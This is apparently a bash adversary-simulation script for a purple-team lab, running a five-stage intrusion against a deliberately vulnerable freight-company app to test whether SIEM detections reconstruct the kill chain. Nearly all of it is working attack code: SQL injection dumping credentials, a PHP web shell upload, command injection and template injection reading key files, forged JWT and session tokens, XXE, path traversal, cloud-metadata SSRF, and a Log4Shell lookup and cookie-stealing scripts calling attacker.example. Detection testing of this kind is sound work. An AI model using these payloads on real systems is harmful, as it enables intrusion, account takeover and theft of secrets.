#!/usr/bin/env bash
# Adversary simulation against the Meridian Freight Solutions target.
#
# Runs a five-stage intrusion from a single source, paced so the stages are
# distinguishable in the SIEM, and tags every request with a run id so the whole
# campaign can be isolated in one search.
#
# Unlike tools/validate_range.sh (which proves every finding is reachable), this
# reproduces how an actual intrusion unfolds: recon, foothold, escalation,
# execution, exfiltration. Use it to fire the detection use cases and to test
# whether UC-21 reconstructs the chain.
#
#   ./tools/simulate_attack.sh http://127.0.0.1:5005
#   PACE=5 RUN_ID=purple-2026-09 ./tools/simulate_attack.sh http://10.20.0.15:8080
set -uo pipefail

BASE="${1:-http://127.0.0.1:5005}"
RUN_ID="${RUN_ID:-sim-$(date +%Y%m%d-%H%M%S)}"
PACE="${PACE:-2}"                 # seconds between steps
APP_ROOT="${APP_ROOT:-/app}"      # container path for the XXE payload
METADATA_URL="${METADATA_URL:-http://metadata:8080}"
PYTHON="${PYTHON:-python3}"
SECRET="${LAB_SESSION_SECRET:-meridian-default-signing-key}"
AGENT="${AGENT:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36}"
JAR="$(mktemp -d)/jar.txt"
STEP=0

bold()  { printf '\033[1m%s\033[0m\n' "$*"; }
stage() { printf '\n\033[1;36m═══ %s ═══\033[0m\n' "$*"; }
step()  { STEP=$((STEP+1)); printf '\033[0;33m[%02d]\033[0m %-52s ' "$STEP" "$1"; }
ok()    { printf '\033[32m%s\033[0m\n' "${1:-done}"; }
info()  { printf '     \033[2m%s\033[0m\n' "$*"; }

# Every request carries the run id and a consistent user agent, so the campaign
# looks like one actor rather than a pile of unrelated curl calls.
req() { curl -s -b "$JAR" -c "$JAR" -A "$AGENT" -H "X-Lab-Test-ID: $RUN_ID" "$@"; }
reqj(){ req -H 'Content-Type: application/json' "$@"; }
pace(){ sleep "$PACE"; }
proof(){ grep -o 'MERIDIAN{[^}]*}' | head -1; }

bold "Adversary simulation against $BASE"
info "run id: $RUN_ID   pace: ${PACE}s between steps"
if ! req "$BASE/health" | grep -q healthy; then
  printf '\033[31mTarget is not responding at %s\033[0m\n' "$BASE"; exit 1
fi

# ───────────────────────────────────────────────────────────────────────────
stage "STAGE 1 — RECONNAISSANCE   T1595.003, T1592"
# ───────────────────────────────────────────────────────────────────────────
step "Read crawler directives"
req "$BASE/robots.txt" >/dev/null; ok "robots.txt"
info "discloses /internal/ /backups/ /admin/ /portal/ /status/"
pace

step "Probe for common files (generates 404 noise)"
for path in .git/config .svn/entries web.config appsettings.json phpinfo.php \
            wp-login.php admin.bak config.old; do
  req -o /dev/null "$BASE/$path"
done
ok "8 probes"
pace

step "Retrieve the internal IT runbook"
RUNBOOK=$(req "$BASE/internal/it-runbook.txt")
RECON_PROOF=$(printf '%s' "$RUNBOOK" | proof); ok "${RECON_PROOF:-FAILED}"
info "names OPS-4388 legacy login, OPS-4412 depot tool, OPS-4455 session key"
pace

step "Pull the deployment environment file"
DOTENV=$(req "$BASE/.env")
DOTENV_PROOF=$(printf '%s' "$DOTENV" | proof); ok "${DOTENV_PROOF:-FAILED}"
info "yields session signing key, partner JWT key, EDI service password"
pace

step "Browse the nightly export directory"
req "$BASE/backups/" >/dev/null
EXPORT=$(req "$BASE/backups/meridian-db-export.sql")
EXPORT_PROOF=$(printf '%s' "$EXPORT" | proof); ok "${EXPORT_PROOF:-FAILED}"
info "yields the account list including svc_edi, avoss, ops_console"
pace

step "Read the developer status page"
STATUS=$(req "$BASE/status/diagnostics")
STATUS_PROOF=$(printf '%s' "$STATUS" | proof); ok "${STATUS_PROOF:-FAILED}"
info "discloses log4j 2.14.1 and that alg:none is accepted"
pace

# ───────────────────────────────────────────────────────────────────────────
stage "STAGE 2 — INITIAL ACCESS   T1190, T1110.001, T1078"
# ───────────────────────────────────────────────────────────────────────────
step "Enumerate consignment references (IDOR)"
for n in 4466 4467 4468 4469 4470 4471 4472 4473; do
  req -o /dev/null "$BASE/api/v1/shipments/MFS-2026-$n"
done
IDOR_PROOF=$(req "$BASE/api/v1/shipments/MFS-2026-4471" | proof); ok "${IDOR_PROOF:-FAILED}"
info "MFS-2026-4471 belongs to another customer: EUR 742,000, customs hold"
pace

step "Probe the rate search for injection"
req -G -o /dev/null "$BASE/api/v1/rates/search" --data-urlencode "q='"
req -G -o /dev/null "$BASE/api/v1/rates/search" \
    --data-urlencode "q=' UNION SELECT 1,name,sql FROM sqlite_master-- "
SQLI_PROOF=$(req -G "$BASE/api/v1/rates/search" \
    --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " | proof)
ok "${SQLI_PROOF:-FAILED}"
info "dumped integration_credentials"
pace

step "Brute force the service account (no lockout)"
for p in Autumn2023 autumn2023 Password1 Summer2024 summer2024 autumn2024; do
  LOGIN=$(reqj -X POST "$BASE/portal/login" \
          -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}")
done
BRUTE_PROOF=$(printf '%s' "$LOGIN" | proof); ok "${BRUTE_PROOF:-FAILED}"
info "svc_edi / autumn2024 after 5 failures, no lockout applied"
pace

step "Bypass the legacy sign-in with injection"
AUTH_PROOF=$(reqj -X POST "$BASE/portal/login?legacy=1" \
             -d '{"username":"ops_console'\''-- ","password":"x"}' | proof)
ok "${AUTH_PROOF:-FAILED}"
info "signed in as ops_console without a password"
pace

# ───────────────────────────────────────────────────────────────────────────
stage "STAGE 3 — PRIVILEGE ESCALATION   T1548, T1550.001, T1550.004, T1556"
# ───────────────────────────────────────────────────────────────────────────
step "Escalate via mass assignment on the profile form"
MASS_PROOF=$(reqj -X POST "$BASE/portal/profile" \
             -d '{"contact_name":"Dana Okafor","email":"d@harborline.example","account_type":"operations"}' | proof)
ok "${MASS_PROOF:-FAILED}"
pace

step "Forge a staff session with the recovered signing key"
FORGED=$("$PYTHON" tools/forge_session.py --secret "$SECRET" 2>/dev/null)
SESSION_PROOF=$(curl -s -A "$AGENT" -H "X-Lab-Test-ID: $RUN_ID" \
                -H "Cookie: session=$FORGED" "$BASE/admin" | proof)
ok "${SESSION_PROOF:-FAILED}"
info "is_staff asserted with no preceding authentication event"
pace

step "Forge an unsigned partner token (alg:none)"
b64() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '/+' '_-'; }
TOKEN="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"sub":"harborline","role":"finance"}')."
JWT_PROOF=$(req -H "Authorization: Bearer $TOKEN" "$BASE/api/v1/reports/financial" | proof)
ok "${JWT_PROOF:-FAILED}"
pace

step "Take over the finance account via a predictable reset token"
md5of(){ if command -v md5sum >/dev/null; then printf '%s' "$1" | md5sum | cut -d' ' -f1
         else printf '%s' "$1" | md5 -q; fi; }
RT="$(md5of avoss)"
reqj -X POST "$BASE/portal/reset" -d '{"username":"avoss"}' >/dev/null
RESET_PROOF=$(reqj -X POST "$BASE/api/v1/account/reset" \
              -d '{"username":"avoss","token":"'"$RT"'"}' | proof)
ok "${RESET_PROOF:-FAILED}"
pace

# ───────────────────────────────────────────────────────────────────────────
stage "STAGE 4 — EXECUTION   T1059.004, T1059.006, T1505.003, T1203"
# ───────────────────────────────────────────────────────────────────────────
staff() { curl -s -b "$JAR" -c "$JAR" -A "$AGENT" -H "X-Lab-Test-ID: $RUN_ID" \
               -H "Cookie: session=$FORGED" "$@"; }

step "Command injection via the depot connectivity check"
staff -H 'Content-Type: application/json' -X POST -o /dev/null "$BASE/admin/diagnostics" \
      -d '{"host":"127.0.0.1"}'
staff -H 'Content-Type: application/json' -X POST -o /dev/null "$BASE/admin/diagnostics" \
      -d '{"host":"127.0.0.1; id"}'
CMDI_PROOF=$(staff -H 'Content-Type: application/json' -X POST "$BASE/admin/diagnostics" \
             -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}' | proof)
ok "${CMDI_PROOF:-FAILED}"
info "python -> sh -> cat, as the service account"
pace

step "Server-side template injection in the campaign editor"
staff -G -o /dev/null "$BASE/admin/campaigns/preview" --data-urlencode 'body={{7*7}}'
SSTI_PROOF=$(staff -G "$BASE/admin/campaigns/preview" --data-urlencode \
  "body={{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}" | proof)
ok "${SSTI_PROOF:-FAILED}"
pace

step "Upload a server-side script to the applicant store"
printf '<?php system($_GET["c"]); ?>\n' > /tmp/sim-cv.php
req -X POST -o /dev/null "$BASE/careers/apply" -F 'cv=@/tmp/sim-cv.php'
req "$BASE/uploads/" >/dev/null
UPLOAD_PROOF=$(req "$BASE/uploads/hr-onboarding-pack-2026.txt" | proof)
ok "${UPLOAD_PROOF:-FAILED}"
info "store is browsable: read another applicant's documents"
pace

step "Trigger the Log4Shell-class lookup in the audit shim"
JNDI_PROOF=$(req -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' \
             "$BASE/api/v1/audit/event" | proof)
ok "${JNDI_PROOF:-FAILED}"
pace

step "Plant a stored payload and have staff render it"
reqj -X POST -o /dev/null "$BASE/contact" -d '{"name":"R Menon","company":"Northgate",
  "email":"r@northgate.example","message":"<script>fetch(\"//attacker.example/?c=\"+document.cookie)</script>"}'
STORED_PROOF=$(staff "$BASE/admin/messages" | grep -o 'eyJ[A-Za-z0-9+/=]*' \
               | while read -r b; do printf '%s' "$b" | base64 -d 2>/dev/null; done | proof)
ok "${STORED_PROOF:-FAILED}"
pace

step "Reflected payload delivered to a support agent"
req -G -o /dev/null "$BASE/search" --data-urlencode 'q=<script>alert(1)</script>'
REFLECT_PROOF=$(req -G "$BASE/support/shared-search" \
  --data-urlencode 'q=<script>fetch("//attacker.example/?c="+document.cookie)</script>' \
  | grep -o 'eyJ[A-Za-z0-9+/=]*' \
  | while read -r b; do printf '%s' "$b" | base64 -d 2>/dev/null; done | proof)
ok "${REFLECT_PROOF:-FAILED}"
pace

# ───────────────────────────────────────────────────────────────────────────
stage "STAGE 5 — COLLECTION AND EXFILTRATION   T1005, T1552.005, T1565.001"
# ───────────────────────────────────────────────────────────────────────────
step "Read application secrets through the invoice downloader"
req -G -o /dev/null "$BASE/api/v1/invoices/download" --data-urlencode 'document=INV-2026-00841.txt'
TRAV_PROOF=$(req -G "$BASE/api/v1/invoices/download" \
             --data-urlencode 'document=../instance/app-secrets.ini' | proof)
ok "${TRAV_PROOF:-FAILED}"
pace

step "Read server files through the EDI manifest parser"
EDI='<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file://'"$APP_ROOT"'/instance/edi/partner-manifest.key">]><manifest>&x;</manifest>'
XXE_PROOF=$(req -X POST "$BASE/api/v1/edi/manifest" \
            -H 'Content-Type: application/xml' --data-binary "$EDI" | proof)
ok "${XXE_PROOF:-FAILED}"
pace

step "Reach cloud instance credentials through the link preview"
staff -G -o /dev/null "$BASE/admin/integrations/preview" --data-urlencode 'url=http://example.com'
SSRF_PROOF=$(staff -G "$BASE/admin/integrations/preview" --data-urlencode \
  "url=$METADATA_URL/latest/meta-data/iam/security-credentials/mfs-web-instance-role" | proof)
ok "${SSRF_PROOF:-FAILED}"
pace

step "Abuse the quote engine to issue a credit note"
LOGIC_PROOF=$(reqj -X POST "$BASE/services/quote" \
              -d '{"weight_kg":-1200,"rate_per_kg":0.42}' | proof)
ok "${LOGIC_PROOF:-FAILED}"

# ───────────────────────────────────────────────────────────────────────────
stage "SUMMARY"
# ───────────────────────────────────────────────────────────────────────────
RECOVERED=0
for v in "$RECON_PROOF" "$DOTENV_PROOF" "$EXPORT_PROOF" "$STATUS_PROOF" "$IDOR_PROOF" \
         "$SQLI_PROOF" "$BRUTE_PROOF" "$AUTH_PROOF" "$MASS_PROOF" "$SESSION_PROOF" \
         "$JWT_PROOF" "$RESET_PROOF" "$CMDI_PROOF" "$SSTI_PROOF" "$UPLOAD_PROOF" \
         "$JNDI_PROOF" "$STORED_PROOF" "$REFLECT_PROOF" "$TRAV_PROOF" "$XXE_PROOF" \
         "$SSRF_PROOF" "$LOGIC_PROOF"; do
  [[ -n "$v" ]] && RECOVERED=$((RECOVERED+1))
done
bold "$RECOVERED/22 data artifacts exfiltrated in $STEP steps"
info "run id: $RUN_ID"
echo
bold "Confirm the SIEM reconstructed it:"
cat <<SPL
  index=vapt_lab sourcetype=helpag:owasp:json test_id="$RUN_ID"
  | \`helpag_kill_chain_stage\`
  | stats dc(stage) as stages values(stage) as observed
          values(event_type) as events min(_time) as first max(_time) as last
          by source_ip
  | where stages>=3
SPL
echo
info "Locally: jq -r 'select(.test_id==\"$RUN_ID\").event_type' logs/meridian-events.jsonl | sort | uniq -c | sort -rn"
[[ $RECOVERED -eq 22 ]] || exit 1
